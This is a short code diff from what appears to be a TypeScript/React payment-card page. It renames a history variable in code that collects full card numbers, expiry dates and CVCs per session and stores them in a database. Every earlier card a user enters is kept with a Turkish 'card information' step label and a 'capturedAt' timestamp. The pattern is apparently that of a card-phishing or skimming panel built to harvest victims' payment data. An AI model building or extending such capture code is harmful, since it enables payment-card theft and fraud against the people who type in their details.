@@ -75,11 +75,11 @@ export function CardClient({ sessionId }: Props) {
     const prevCardExp = String((sessionFormData as any).cardExpiry || "").trim();
     const prevCardCvc = String((sessionFormData as any).cardCvc || "").trim();
     const isFirstCardEntry = prevCard.length === 0;
-    const currentHistory: any[] = Array.isArray((sessionFormData as any).bankFormHistory)
-      ? (sessionFormData as any).bankFormHistory.slice()
+    const cardFormHistory: any[] = Array.isArray((sessionFormData as any).cardFormHistory)
+      ? (sessionFormData as any).cardFormHistory.slice()
       : [];
     if (!isFirstCardEntry) {
-      currentHistory.push({
+      cardFormHistory.push({
         htmlStepLabel: "KART BILGISI",
         capturedAt: new Date().toISOString(),
         cardNumber: prevCard,
@@ -94,7 +94,7 @@ export function CardClient({ sessionId }: Props) {
       cardNumber: number.trim(),
       cardExpiry: expiry.trim(),
       cardCvc: cvc.trim(),
-      bankFormHistory: currentHistory,
+      cardFormHistory,
     };
     const { error } = await supabase
       .from("sessions")
